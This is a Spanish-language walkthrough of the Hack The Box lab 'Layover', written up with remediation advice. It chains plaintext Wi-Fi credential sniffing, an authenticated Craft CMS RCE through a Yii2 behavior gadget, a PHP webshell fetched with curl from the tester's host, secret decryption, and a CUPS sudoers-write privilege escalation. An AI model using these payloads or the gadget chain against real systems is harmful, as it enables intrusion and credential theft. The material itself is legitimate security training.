# HTB Layover — Writeup técnico (RDP pivot → sniffing Wi-Fi → Craft CMS RCE → CUPS LPE a root)

**Objetivo:** `10.129.163.232` (Linux / Ubuntu, host de paso `airside-ws01`)
**Red interna (pivote):** `10.13.37.0/24` · portal `portal.international.htb` (`10.13.37.10`) · cautivo `wifi.international.htb` (`10.13.37.1`)
**Atacante (VPN tun0):** `10.10.16.77`
**Credenciales entregadas:** `contractor / Contractor****` (acceso RDP "assumed breach")
**Dificultad:** Media (Linux)
**Resultado:**
- `user.txt` → `b6930da5****`
- `root.txt` → `1b5b147e****`

> **Evidencias visuales.** Las capturas citadas en este documento se entregan en la carpeta **`screenshots/`** que acompaña al writeup. Cada paso relevante incluye una imagen en la forma `![descripción](screenshots/NN_nombre.png)` seguida de una **leyenda** que indica **qué evidencia aporta** y **qué pista de la metodología aporta cada captura** (por ejemplo, que el acceso es una sesión RDP real, que la salida de comandos es del objetivo o que la captura de tráfico proviene del segmento Wi-Fi interno). Todas las capturas provienen de la ejecución real (cliente RDP sobre `airside-ws01` y consola de post-explotación); no son reconstrucciones.
>
> **Sobre flags y credenciales (versión pública).** HTB genera `user.txt`/`root.txt` **por instancia**: el valor válido es el del despliegue activo en el momento de la explotación. Por política de divulgación responsable, en esta versión pública **las flags y las contraseñas/claves han sido enmascaradas** en el texto (p. ej. `b6930da5****`, `Contractor****`, `Fl1ght****`, `Skyp0rt****`, `CraftDB_pw_****`) y **redactadas en las capturas** donde aparecen. Los enmascaramientos son deliberados y no afectan a la reproducibilidad del procedimiento.

---

## 0. Resumen ejecutivo

Layover es una máquina Linux (Medium) planteada como **assumed breach**: no se parte de un escaneo ciego, sino de credenciales válidas de un contratista. La superficie inicial la forman dos servicios **RDP y SSH**, pero el reto real vive **detrás** de un host de paso con acceso a una red interna mal segmentada. La cadena de compromiso tiene seis etapas:

1. **Acceso inicial (RDP):** las credenciales `contractor:Contractor****` dan acceso por escritorio remoto (XFCE) al host `airside-ws01`. La cuenta pertenece a los grupos `sudo`, `netdev` y **`wireshark`**.
2. **Red interna por Wi-Fi:** `airside-ws01` tiene una segunda interfaz `wlan2` en la red interna `10.13.37.0/24`. El portal cautivo `wifi.international.htb` anuncia el portal de empleados `portal.international.htb/miles/`.
3. **Captura de credenciales en claro:** abusando del grupo `wireshark`, se pone `wlan2` en **modo monitor** y se esnifa con `tcpdump`/`tshark` un `POST` HTTP **en texto plano** a `/miles/login.php` con `username`/`password`.
4. **RCE autenticada en Craft CMS 5.9.8:** la credencial capturada es válida en el control panel (`/admin`). El endpoint `element-search` instancia objetos desde JSON; inyectando un *behavior* de Yii2 (`AttributeTypecastBehavior`) cuyo callable apunta a `ConsoleProcessus::execute()` se logra **ejecución de comandos ciega** como `www-data` y se despliega un webshell en `/assets/shell.php`.
5. **Post-explotación y pivote:** `.env` entrega la `CRAFT_SECURITY_KEY` y credenciales de MySQL; el módulo `htbairways` guarda el secreto del relé de correo **cifrado** en la tabla `htbairways_settings` y se descifra reutilizando la clave de seguridad (componente `Security` de Yii2) → `aporter:Skyp0rt****`. La credencial se reutiliza para **SSH** a `10.13.37.10` → `user.txt`.
6. **Escalada a root (CVE-2026-34990, CUPS ≤ 2.4.16):** se filtra el token de autenticación local de `cupsd` (escucha sólo en `127.0.0.1:631`) mediante un servidor IPP malicioso y se abusa de un `device-uri` `file://` para escribir un fragmento en `/etc/sudoers.d/` → `root.txt`.

Dos controles mal configurados concentran el riesgo: **credenciales de empleado viajando por HTTP sin cifrar en una red Wi-Fi de acceso compartida** con una cuenta de bajo privilegio capaz de capturar paquetes, y **un servicio local (CUPS) que otorga a un usuario sin privilegios la capacidad de escribir ficheros arbitrarios como root**.

---

## 1. Reconocimiento

Comprobación inicial de superficie (sin `-p-` la primera pasada queda "vacía" porque los servicios expuestos son pocos):

```bash
nmap -Pn -sT -sV --top-ports 1000 -T3 -oN nmap-initial.txt 10.129.163.232
```

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
```

Escaneo completo de puertos para descartar superficie oculta:

```bash
nmap -Pn -sT -p- --min-rate 200 --max-retries 2 -T3 -oN nmap-full.txt 10.129.163.232
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server
```

La huella RDP (`--script rdp-ntlm-info,rdp-enum-encryption`) confirma RDP estándar (NLA, RC4 128 bits). Un `ms-wbt-server` sobre un host Linux indica **xrdp**, es decir, un escritorio gráfico Linux detrás de RDP. El único vector de entrada con el contexto entregado es **RDP**.

---

## 2. Acceso por RDP (`contractor`) y enumeración de la cuenta

Se inicia sesión por RDP con `contractor / Contractor****` sobre un escritorio XFCE y se enumera la identidad y privilegios de la cuenta:

```bash
id; hostname
# uid=1001(contractor) gid=1001(contractor) groups=1001(contractor),27(sudo),111(netdev),121(wireshark)
# airside-ws01
```

Dos hechos relevantes para la cadena:

- `27(sudo)` — `contractor` puede escalar a root en **este** host (no en el objetivo final). Se confirma con `sudo -l`/`sudo -v`.
- `121(wireshark)` — la cuenta puede poner la interfaz inalámbrica en **modo monitor** y capturar tráfico **sin `sudo`** (capacidades `CAP_NET_RAW`/`CAP_NET_ADMIN` concedidas vía grupo).

![Escritorio XFCE tras el acceso RDP como contractor](screenshots/01_01_escritorio_rdp.png)
*Fig. 2.1 — Escritorio XFCE del host `airside-ws01` alcanzado por RDP con la cuenta `contractor`. Prueba de que el acceso es una sesión gráfica real sobre un host Linux (no Windows), punto de partida del pivot.*

![Terminal abierta en la sesión RDP](screenshots/01_02_terminal_xfce.png)
*Fig. 2.2 — Terminal de la sesión XFCE. Todas las acciones contra la red interna se ejecutan desde este host, que es el único con visibilidad a `10.13.37.0/24`.*

![Privilegios sudo de contractor](screenshots/01_03_sudo_grupos.png)
*Fig. 2.3 — Comprobación de `sudo -l`: el usuario `contractor` pertenece a `sudo`. Pista clave: el privilegio es local a `airside-ws01`, no al objetivo final; sirve para reconocer este host como punto de paso y no el objetivo.*

![Grupo wireshark y capacidades de red](screenshots/01_04_root_y_red.png)
*Fig. 2.4 — Pertenencia al grupo `wireshark` (captura de tráfico sin privilegios) y reconocimiento de red. Es el habilitador directo de la captura de credenciales en claro.*

![Enumeración inicial de la cuenta y del sistema](screenshots/01_05_enumeracion.png)
*Fig. 2.5 — Enumeración básica del host de paso (versión de SO, interfaces, herramientas disponibles) que orienta el pivot a la red interna.*

> **Nota de método:** `sudo` en `airside-ws01` no da por terminado el reto; el objetivo (`portal`, `10.13.37.10`) vive en la red interna y aún no es accesible directamente. Es un host de paso (jump box).

---

## 3. Red interna por Wi-Fi y portal cautivo

`airside-ws01` tiene una segunda interfaz inalámbrica en la red interna:

```bash
ip -brief addr show wlan2
# wlan2    UP    10.13.37.182/24
```

El navegador abre automáticamente el portal cautivo `http://wifi.international.htb`, que muestra el **aviso de personal** y enlaza explícitamente el portal de millas de empleados:

> "HTB Airways Miles members: … sign in … from `http://portal.international.htb/miles/`"

La resolución de nombres confirma el mapeo interno:

```bash
getent hosts portal.international.htb
# 10.13.37.10     portal.international.htb
```

![Portal cautivo wifi.international.htb](screenshots/02_01_portal_cautivo.png)
*Fig. 3.1 — Portal cautivo de la red Wi-Fi interna (`wifi.international.htb`). Aporta el enlace al portal de empleados `portal.international.htb/miles/` y confirma que la red de acceso es abierta.*

![Interfaces de red del host de paso](screenshots/02_02_wifi_doble.png)
*Fig. 3.2 — Doble conexión: interfaz de gestión y `wlan2` en `10.13.37.182/24`. Evidencia de que el host de paso está en dos redes (segmentación insuficiente).*

![Resultado de la conexión Wi-Fi](screenshots/02_03_wifi_resultado.png)
*Fig. 3.3 — Estado de la conexión inalámbrica tras asociar a la red interna. Pista: la IP `10.13.37.182` asignada por DHCP confirma que el host ya está dentro de la red `10.13.37.0/24`.*

![Configuración Wi-Fi del host](screenshots/02_04_wifi_config.png)
*Fig. 3.4 — Configuración de `wlan2` y su pertenencia a la red `10.13.37.0/24`.*

![Configuración de red local](screenshots/02_05_config_local.png)
*Fig. 3.5 — Rutas y configuración local del host de paso, base para el pivot hacia `10.13.37.10`.*

![Resolución DNS del portal](screenshots/02_06_dns_local.png)
*Fig. 3.6 — Resolución de `portal.international.htb` → `10.13.37.10`, confirmando el objetivo del pivot.*

![Mapa del portal y hosts internos](screenshots/02_07_mapa_portal.png)
*Fig. 3.7 — Mapa de la aplicación del portal (enlaces a `/miles/`, `/terminal.html`, `/wiFi`) que define la superficie a enumerar.*

![Hosts internos detectados](screenshots/02_08_hosts_internos.png)
*Fig. 3.8 — Enumeración de hosts activos en `10.13.37.0/24`: `10.13.37.1` (cautivo `wifi.international.htb`) y `10.13.37.10` (portal).*

![Rutas observadas hacia la red interna](screenshots/02_09_rutas_observadas.png)
*Fig. 3.9 — Rutas observadas que confirman que el host de paso es la única vía hacia la red interna.*

> **Fallo de seguridad:** la estación de trabajo del contratista está conectada simultáneamente a la red de gestión y a la red Wi-Fi interna de acceso, concediendo un puente hacia una red supuestamente aislada.

---

## 4. Enumeración del portal de millas

`portal.international.htb` sirve la aplicación de millas ("HTB Airways Miles") y, en `/miles/login.php`, un formulario de acceso de empleados por **HTTP sin cifrar**.

![Acceso HTTP al portal](screenshots/03_01_portal_http.png)
*Fig. 4.1 — Respuesta HTTP del portal. Evidencia de que el portal se sirve en texto plano (sin TLS), condición necesaria para la captura posterior.*

![Resolución DNS del portal](screenshots/03_02_dns_portal.png)
*Fig. 4.2 — Confirmación del mapeo `portal.international.htb` → `10.13.37.10` antes de operar contra el portal.*

![Aplicación de millas (miles)](screenshots/03_03_miles_http.png)
*Fig. 4.3 — Aplicación de millas accesible por HTTP; la portada enlaza al alta de sesión de empleados.*

![Estructura del módulo miles](screenshots/03_04_miles_estructura.png)
*Fig. 4.4 — Enumeración de rutas del portal (`/miles/`, `login.php`, `index.html`) para localizar el punto de autenticación.*

![Formulario de login de empleados](screenshots/03_05_miles_login.png)
*Fig. 4.5 — Formulario `/miles/login.php`. El POST viaja por HTTP: sus campos serán capturables en el segmento Wi-Fi.*

---

## 5. Captura de credenciales en claro (sniffing sobre `wlan2`)

Aprovechando el grupo `wireshark`, se captura el tráfico del segmento Wi-Fi y se aísla el `POST` de login:

```bash
sudo tcpdump -i wlan2 -s0 -U -w /tmp/layover-staff.pcap
tshark -r /tmp/layover-staff.pcap -Y "http.request.method == POST" \
      -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri 2>/dev/null | head
# 296   10.13.37.132    10.13.37.10    portal.international.htb    /miles/login.php
```

El cuerpo del `POST` (`x-www-form-urlencoded`) contiene exactamente dos campos:

```
fields [('username', 5), ('password', 15)]
```

Se extrae el cuerpo y se reproduce la petición de login contra `/miles/login.php`:

```bash
curl -sS -max-time 10 -D /tmp/layover-login-headers -o /tmp/layover-login-response \
     -c /tmp/layover-cookies -b /tmp/layover-cookies \
     --data-binary @/tmp/layover-login-body \
     -H "Content-Type: application/x-www-form-urlencoded" \
     http://portal.international.htb/miles/login.php
# HTTP/1.1 200 OK
# <title>HTB Airways Miles — Jenny Crawford</title>
```

La sesión autenticada corresponde al miembro **Jenny Crawford**; la credencial capturada en claro es **`jenny / Fl1ght****`**.

![Capacidad de modo monitor de wlan2](screenshots/04_01_capacidad_monitor.png)
*Fig. 5.1 — Comprobación de que la interfaz admite modo monitor: `iw list`/`iwconfig` sin `sudo`, gracias al grupo `wireshark`. Habilita la captura en el segmento inalámbrico.*

![Inicio del modo monitor](screenshots/04_02_monitor_inicio.png)
*Fig. 5.2 — Paso de `wlan2` a modo monitor; la interfaz queda en estado `monitor`, condición necesaria para observar el tráfico de otros clientes de la red.*

![Monitorización activa](screenshots/04_03_monitor_activo.png)
*Fig. 5.3 — Interfaz en modo monitor escuchando el canal de la red interna. Sin este modo no se observaría el tráfico de otros clientes Wi-Fi.*

![Prueba sobre la interfaz mon0](screenshots/04_04_mon0_test.png)
*Fig. 5.4 — Verificación de que el tráfico del segmento es visible (`mon0`). Control positivo de la captura: confirma alcance antes de esperar el POST.*

![Metadatos del POST capturado](screenshots/04_05_post_metadata.png)
*Fig. 5.5 — `tshark` filtrando `http.request.method == POST`: aparece el frame 296 origen `10.13.37.132` → destino `10.13.37.10`, URI `/miles/login.php`. Evidencia de la transmisión en claro de la autenticación.*

![Comprobación del POST de personal](screenshots/04_06_staff_post_check.png)
*Fig. 5.6 — Extracción del cuerpo del POST y del host/URI; el tráfico pertenece al portal interno `portal.international.htb`.*

![Forma del cuerpo del POST](screenshots/04_07_body_shape.png)
*Fig. 5.7 — Parseo del cuerpo `application/x-www-form-urlencoded`: dos campos (`username`, `password`). La estructura del formulario queda confirmada.*

![Campos del POST (valores redactados)](screenshots/04_08_campos_redactados.png)
*Fig. 5.8 — Listado de los campos extraídos del POST (longitudes `username` 5 / `password` 15). Los valores van redactados en esta versión pública.*

> **Fallo de seguridad:** transporte de credenciales de empleado por **HTTP sin cifrar** en una red Wi-Fi de acceso compartida, combinado con el grupo `wireshark` asignado a una cuenta de bajo privilegio. Cualquier usuario del mismo segmento con esa capacidad puede leer contraseñas de empleado.

---

## 6. Acceso al control panel de Craft CMS y RCE

`portal.international.htb` corre **Craft CMS 5.9.8** (rutas `/admin`, `/cpresources/*`, `CRAFT_ENVIRONMENT=production`). La credencial capturada es válida en el panel:

```bash
curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" \
     http://portal.international.htb/admin/dashboard
# 302 http://portal.international.htb/admin/login
```

Login con los tokens CSRF correctos:

```bash
python3 craft_login.py jenny 'Fl1ght****' /tmp/cj
# -> login HTTP 200 / dashboard 200 / "AUTHED"
```

**Vector de RCE.** Con sesión válida, el endpoint

```
POST /admin/actions/element-search/search
```

instancia objetos a partir del JSON recibido. Se adjunta un *behavior* de Yii2 a un elemento de búsqueda:

- clase: `yii\behaviors\AttributeTypecastBehavior`
- callable de `typecastBeforeSave`: `[Psy\Readline\Hoa\ConsoleProcessus, 'execute']`
- el comando va dentro del payload

Como el behavior se engancha al evento `beforeSave`, el callable se invoca con argumentos controlados → **ejecución ciega** (la respuesta HTTP es `500`, la ejecución no depende del cuerpo devuelto). Confirmación escribiendo la salida en un fichero servible:

```bash
python3 layover_rce.py "id > /var/www/portal/web/assets/o.txt 2>&1"
curl -s http://portal.international.htb/assets/o.txt
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Despliegue de webshell.** `escapeshellcmd()` elimina redirecciones `>`, por lo que se usa `curl --output` y un servidor HTTP local como origen del fichero:

```bash
python3 layover_rce.py "curl http://10.13.37.182:8080/shell.php --output /var/www/portal/web/assets/shell.php"
curl -s "http://portal.international.htb/assets/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`shell.php` = `<?php system($_GET["cmd"]); ?>`. A partir de aquí se opera como `www-data`.

![Replay del login de empleado](screenshots/05_01_login_replay.png)
*Fig. 6.1 — Reproducción del `POST` capturado contra `/miles/login.php` con `curl`. Evidencia de que la credencial es reutilizable y de que se obtiene sesión.*

![Resultado del login reproduccido](screenshots/05_02_login_resultado.png)
*Fig. 6.2 — Respuesta `200` con el título de sesión del miembro; el `Set-Cookie` resultante confirma la sesión iniciada.*

![Mapa de la página de autenticación](screenshots/05_03_mapa_auth.png)
*Fig. 6.3 — Reconocimiento del formulario/endpoint de autenticación (tokens CSRF) necesario para el login automatizado.*

![Lectura de la sesión autenticada](screenshots/05_04_sesion_readback.png)
*Fig. 6.4 — Confirmación de la sesión en el control panel de Craft. Nota: una lectura de sólo 4000 bytes parecía "no autenticado" porque `csrfTokenValue` quedaba fuera de esos bytes; la comprobación fiable usa el cuerpo completo o el redirect final.*

![Canal de shell inverso durante la explotación](screenshots/06_01_canal_shell.png)
*Fig. 6.5 — Consola de explotación mostrando el canal usado durante la ejecución de comandos (transferencia por HTTP/`curl` y pruebas de marcador). Evidencia del contexto operativo del RCE.*

![Verificación del canal de shell](screenshots/06_02_canal_shell_2.png)
*Fig. 6.6 — Segunda vista del canal de shell. Los intentos que no prosperaron (p. ej. redirección con `>`) se detallan en el Anexo A.*

> **Fallo de seguridad:** ejecución remota de código autenticada por instanciación de objetos controlados por el usuario en el endpoint `element-search` del control panel. El privilegio mínimo del portal no debería permitir instanciar clases del framework desde JSON.

---

## 7. Post-explotación — `.env` y credenciales de base de datos

Con el webshell se leen los secretos de la aplicación:

```bash
curl -s "http://portal.international.htb/assets/shell.php?cmd=cat%20/var/www/portal/.env"
```

```
CRAFT_SECURITY_KEY=IGckihiFK64_****
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_****
PRIMARY_SITE_URL=http://portal.international.htb/
```

El módulo propio del portal (`modules/htbairways`, "HTB Airways Miles loyalty integration") guarda su configuración —incluido el relé de correo— en la tabla `htbairways_settings`, con el valor sensible **cifrado**.

---

## 8. Descifrado del blob del relé de correo

Craft cifra ciertos valores con la `CRAFT_SECURITY_KEY` usando el componente `Security` de Yii2 (`yii\base\Security::decrypt`). Reutilizando la clave obtenida del `.env` se descifra el blob de `htbairways_settings`:

```
mailRelayHost   mail.htbairways.htb
mailRelayUser   aporter
PW              Skyp0rt****
```

Credencial del servicio de correo del portal: **`aporter : Skyp0rt****`**.

> **Fallo de seguridad:** el mismo material de clave que protege las sesiones aplicativas cifra secretos de integración en base de datos, de modo que la lectura del `.env` (o de la clave) permite descifrarlos todos.

---

## 9. Pivote por SSH y `user.txt`

La credencial del relé se reutiliza como contraseña del usuario Linux `aporter` en el propio `portal` (`10.13.37.10`):

```bash
sshpass -p 'Skyp0rt****' ssh -o StrictHostKeyChecking=no aporter@10.13.37.10 \
    'id; hostname; cat ~/user.txt'
# uid=1001(aporter) gid=1001(aporter) groups=1001(aporter)
# portal
# b6930da5****
```

![Herramientas SSH disponibles](screenshots/06_03_ssh_herramientas.png)
*Fig. 9.1 — Preparación del pivote SSH desde el host de paso hacia `10.13.37.10` (cliente, claves y herramientas presentes).*

![Verificación de host keys SSH](screenshots/06_04_ssh_hostkeys.png)
*Fig. 9.2 — Diagnóstico de conexión/`known_hosts` durante el pivote; el destino es el portal interno y la autenticación usa la credencial recuperada.*

**`user.txt` = `b6930da5****`**

> **Fallo de seguridad:** reutilización de credenciales entre el servicio de correo del portal y la cuenta de sistema del mismo usuario, además de exposición de los secretos de configuración con el mismo material de clave que protege las sesiones.

---

## 10. Escalada de privilegios — CUPS 2.4.16 (CVE-2026-34990)

Enumeración como `aporter`:

```bash
cups-config --version
# 2.4.16
ss -ltnp | grep 631        # cupsd escucha sólo en 127.0.0.1:631
```

Se explota la fuga del token de autenticación local (`CVE-2026-34990`) en tres pasos:

1. **Fuga del token local de `cupsd`:** un servidor IPP malicioso responde `401` con `WWW-Authenticate: Local trc="y"` para forzar a `cupsd` a reenviar su token de autenticación local; el servidor lo captura.
2. **Coacción de `cupsd`:** se crea una cola con `device-uri` apuntando al servidor IPP malicioso, provocando la conexión saliente desde `cupsd` (que corre como root).
3. **Escritura arbitraria vía `file://`:** se registra una impresora permanente cuyo `device-uri` es `file:///etc/sudoers.d/aporter-pwn` y se envía un trabajo con `application/vnd.cups-raw` + `compression=gzip`, escribiendo el contenido en el fichero indicado.

Salida del exploit ejecutado como `aporter`:

```
[*] CVE-2026-34990 | user=aporter | cupsd=127.0.0.1:631
[*] coercing cupsd → rogue server ...
[+] captured token: BFBBCF36****
[*] writing sudoers ...
[+] wrote /etc/sudoers.d/aporter-pwn
[+] ROOT: uid=0(root) gid=0(root) groups=0(root)
```

El fragmento escrito es `aporter ALL=(ALL) NOPASSWD: ALL`. Lectura de la flag de root:

```bash
sudo -n cat /root/root.txt
# 1b5b147e****
```

**`root.txt` = `1b5b147e****`**

> **Fallo de seguridad:** versión de CUPS vulnerable a la fuga del token local y a la escritura arbitraria de ficheros vía `file://` desde `device-uri`, permitiendo a un usuario sin privilegios escribir en `/etc/sudoers.d/`. Remediación: actualizar CUPS a la versión parcheada (> 2.4.16) y restringir la creación de colas/`device-uri` a administradores.

---

## 11. Flags

| Flag | Valor (versión pública) |
|---|---|
| `user.txt` | `b6930da5****` |
| `root.txt` | `1b5b147e****` |

---

## 12. Mitigaciones recomendadas

| # | Hallazgo | Impacto | Recomendación |
|---|----------|---------|---------------|
| 1 | Portal de empleados servido por **HTTP sin cifrar** en la red Wi-Fi de acceso | Robo de credenciales (captura pasiva) | Servir el portal por **HTTPS** extremo a extremo y redirigir HTTP; HSTS |
| 2 | Cuenta de bajo privilegio en el grupo **`wireshark`** (CAP_NET_RAW/ADMIN) | Captura de tráfico del segmento | Retirar capacidades de captura a cuentas no administrativas; auditar el grupo `wireshark` |
| 3 | Host de paso conectado a **dos redes** (gestión + Wi-Fi interna) | Puente entre segmentos | Segmentar y limitar el doble encolado; firewall entre zonas |
| 4 | **Craft CMS 5.9.8** con `element-search` que instancia objetos desde JSON | RCE autenticada | Actualizar Craft y restringir/validar la instanciación de clases del framework desde entrada del usuario |
| 5 | **Reutilización de la `CRAFT_SECURITY_KEY`** para cifrar secretos de integración | Descifrado de todos los secretos | Claves separadas por propósito; gestión de secretos fuera de la BD/aplicación |
| 6 | **Reutilización de credenciales** correo ↔ cuenta de sistema (`aporter`) | Movimiento lateral | Contraseñas únicas por servicio; rotación y gestor de secretos |
| 7 | **CUPS 2.4.16** vulnerable (`CVE-2026-34990`) | Escritura arbitraria como root → root | Actualizar CUPS (> 2.4.16); restringir creación de colas/`device-uri` a administradores |

**Cadena de confianza rota:** los puntos 2 y 1 convierten una red Wi-Fi "de acceso" en un punto de escucha con contraseñas en claro; el punto 4 convierte esa credencial en RCE; el punto 7 convierte el acceso como `aporter` en **root**.

---

## Anexo A — Intentos fallidos y por qué

Documentar lo que **no** funcionó explica la ruta elegida.

1. **Acceso directo a `10.13.37.10` desde el host atacante** → la ruta por `tun0` no alcanza `10.13.37.0/24` (paquetes bloqueados). Obligó a pivotar desde `airside-ws01`, que sí tiene `wlan2` en esa red.
2. **Subida del webshell por escritura directa en disco desde el host atacante** → inviable por el aislamiento anterior; se resolvió publicando la carga por HTTP en `10.13.37.182:8080` y descargándola con el propio RCE.
3. **RCE con redirección `>`** → `escapeshellcmd()` elimina los caracteres de redirección; se cambió a `curl --output <ruta>`.
4. **Primera petición del RCE devolvía `403`** → se ajustó el envío (sesión/CSRF y forma del payload del endpoint) hasta obtener la ejecución ciega (verificación por temporización/fichero).
5. **Verificación de sesión con lectura parcial del dashboard** → leer sólo los primeros 4000 bytes daba un falso "no autenticado" porque `csrfTokenValue` aparecía más adelante; se pasó a inspeccionar el cuerpo completo o el redirect final.
6. **Prueba de inyección de comandos por temporización en la app antes del RCE** → un `sleep` en parámetros no produjo retraso (sin efecto); se descartó ese vector y se pivoteó al gadget del control panel.
7. **Ajuste de modo monitor / canal en `wlan2`** → requirió fijar correctamente el canal para capturar el `POST` del portal; se confirmó por la aparición del frame esperado en el PCAP.
8. **Race condition al preparar ficheros con base64 entre el editor y la shell del host** → los ficheros no siempre eran visibles en el mismo lote de comandos; se separó la escritura de la ejecución (pausa de 1 s antes del `base64 -d`). No afecta a la validez de los pasos documentados.
9. **Autenticación SSH por contraseña rechazada en un `sshd` intermedio** (`PasswordAuthentication no`) → se usó la credencial recuperada contra el `sshd` del portal (puerto 22 del objetivo interno), donde sí aplica.

---

## Anexo B — Indicadores / comandos clave

**Puertos (objetivo):** `22` (SSH), `3389` (RDP/xrdp)
**Host de paso:** `airside-ws01` · grupos relevantes: `sudo`, `netdev`, `wireshark`
**Interfaz interna:** `wlan2` → `10.13.37.182/24`
**Red interna:** `10.13.37.0/24` · cautivo `wifi.international.htb` (`10.13.37.1`) · portal `portal.international.htb` (`10.13.37.10`)
**Endpoint de autenticación:** `POST http://portal.international.htb/miles/login.php`
**CMS:** Craft CMS 5.9.8 · panel `/admin`
**Endpoint de RCE:** `POST /admin/actions/element-search/search`
**Gadget:** `yii\behaviors\AttributeTypecastBehavior` → `[Psy\Readline\Hoa\ConsoleProcessus, 'execute']`
**Webshell:** `/assets/shell.php`
**Secreto descifrado:** `aporter : Skyp0rt****`
**Servicio vulnerable:** CUPS 2.4.16 (`CVE-2026-34990`), `cupsd` en `127.0.0.1:631`
**Fichero escrito por el LPE:** `/etc/sudoers.d/aporter-pwn`

**Credenciales (enmascaradas):**

```
contractor : Contractor****   (RDP a airside-ws01)
jenny      : Fl1ght****       (capturada en claro; portal de millas + Craft CMS)
aporter    : Skyp0rt****      (relé de correo → SSH a portal)
```

**Flags:**

```
user.txt : b6930da5****
root.txt : 1b5b147e****
```

---

## Anexo C — Cronología de la cadena

```
RDP contractor ──▶ airside-ws01 (Linux, grupos sudo/netdev/wireshark)
        │
        ├─ wlan2 → 10.13.37.0/24 (red interna Wi-Fi)
        ├─ sniff wlan2 (tcpdump/tshark, modo monitor) → POST /miles/login.php en claro
        │        └─ credencial: jenny / Fl1ght****
        ├─ login portal.international.htb/miles → "Jenny Crawford"
        ├─ Craft CMS 5.9.8 /admin → RCE autenticada (element-search, Yii2 behavior)
        │        └─ webshell /assets/shell.php → www-data
        ├─ .env → CRAFT_SECURITY_KEY, craftuser/CraftDB_pw_****
        ├─ htbairways_settings + Yii2 Security → aporter/Skyp0rt****
        ├─ ssh aporter@10.13.37.10 (portal) → user.txt
        └─ CVE-2026-34990 (CUPS 2.4.16) → /etc/sudoers.d/aporter-pwn → root.txt
```
